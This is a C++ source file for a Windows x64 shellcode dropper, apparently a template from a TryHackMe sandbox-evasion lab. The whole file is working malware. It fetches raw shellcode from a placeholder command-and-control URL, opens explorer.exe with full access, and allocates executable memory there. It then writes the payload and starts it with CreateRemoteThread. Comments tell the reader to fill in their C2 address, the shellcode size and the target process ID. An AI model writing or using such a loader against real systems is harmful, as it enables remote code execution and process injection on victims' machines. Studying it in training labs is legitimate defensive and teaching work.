/***********************************************************************
/   Simple Shellcode-dropper template for Windows x64 Architecture
/   used in the THM Sandbox evasion Room. For educational purpose only.
/
/   TODO: implement common evasion techniques.
/
************************************************************************/
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

// Update SHELLCODE_SIZE with your shellcode size in bytes. This should be approximately 510 bytes. 
const int SHELLCODE_SIZE = 510;
// PID of Explorer.exe for use in OpenProcess() API call. Find this using Windows Task Manager or Process Explorer.
const int EXPLORER_PID = 5780;

int downloadAndExecute() {

    HANDLE hProcess;
    SIZE_T dwSize = SHELLCODE_SIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, EXPLORER_PID);

    // Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://yourc2ip/shellcode.raw";
    
    IStream* stream;
    char buff[SHELLCODE_SIZE];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, SHELLCODE_SIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    downloadAndExecute();
    return 0;
}